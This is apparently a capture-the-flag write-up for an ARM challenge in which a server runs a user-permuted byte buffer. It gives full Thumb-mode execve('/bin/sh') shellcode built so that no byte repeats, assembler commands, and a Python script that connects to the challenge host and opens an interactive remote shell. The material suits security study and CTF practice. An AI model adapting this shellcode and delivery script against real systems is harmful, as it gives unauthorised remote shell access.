RAM
===
Description:

>	Hree is a ctue lttile selhlcdoe challenge (old version).
>
>	Server: 52.4.108.221 port 4444

We are given a python script which seems to be running on the server side which
builds a map of all bytes from 0 to 255 and shuffles them around according to a
permutation sequence supplied by the user.
The resulting permuted buffer is then written into an ELF file which gets executed
on an ARM machine.

The goal is to supply a permutation sequence which leads to executable code which
when executed leads to a shell. The crux is, that the shellcode can only contain
each byte one time.

So, we took the usual execve("/bin/sh", NULL, NULL) shellcode and crafted it in
a way that each byte only occurs one time in the resulting binary.

```
.section .text
.global _start
_start:

.code 32
    add    r5, pc, #1
    bx     r5

.bar:
.code 16
    add    r5, #.foo-.bar-1
    ldmia  r5!, {r1-r3}
    add    r1, #3
    sub    r2, #8
    push   {r1-r2}
    mov    r5, sp

    sub    r1, r1, r1
    add    r0, r1, r5
    eor    r2, r2, r2
    mov    r7, #11
    svc    124

    .byte 123
.foo:
.ascii ",bin7sh\x00"
```

The first two lines switch to thumb mode if we are not already in this mode.
This leads to smaller code with mostly 16 bit wide opcodes which makes it easier
for us to make sure each byte only shows up one time in the result.

After that we get the address of our string in r5 and load it into registers r1
to r3 with the following ldmia-instruction. r1 and r2 would suffice here, but we
would end up with duplicate bytes in the result, so we load one more register here
and just don't use the result.

After that, we correct the string by adding 3 to r1 which converts the comma in
the string to a forward slash and we subtract 8 from the second half of the string
to convert the 7 also into a forward slash. Now we can push the correct "/bin/sh"
string back to the stack and get its address into r5.

Next we clear r1 by subtracting it from itself, we move r5 into r0 and clear r2.
These three registers contain the arguments to the syscalls which numer (11) we
load into register r7 in the next instruction. Now, we are ready to invoke
the syscall using the svc instruction. The argument for this instruction is
arbitrarily chosen so that it doesn't collide with other byte values. The same
holds for the following filler-byte which is needed to align the string be loaded
into registers.


We can assemble the code and create a binary file using the following commands
```
arm-linux-gnueabi-as -o shell.o shell.S
arm-linux-gnueabi-ld -o shell shell.o
arm-linux-gnueabi-objcopy -O binary shell.o shell.bin
```

Running a small script on the resulting .bin-file indeed confirms, that each
byte only occurs once:

```python
#!/usr/bin/env python

from collections import Counter

code = open("shell.bin", "r").read()
code = map(ord, code)

print Counter(code)
```

Next, we built a script which created a permutation sequence given the binary
file, sends it over to the remote side and lets us interact with the spawned
shell:

```python
#!/usr/bin/env python2

import socket

HOST = "52.4.108.221"
PORT = 4444

wanted = open("shell.bin").read()[:-1]


current = map(chr, xrange(256))

perms = []
for i, c in enumerate(wanted):
	j = current.index(c)
	assert(j >= i)
	current[i], current[j] = current[j], current[i]
	perms += [i,j]
assert("".join(current).startswith(wanted))
perms = "".join(map(chr, perms))
s=socket.socket()
s.connect((HOST, PORT))
s.sendall(perms)

import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()

```
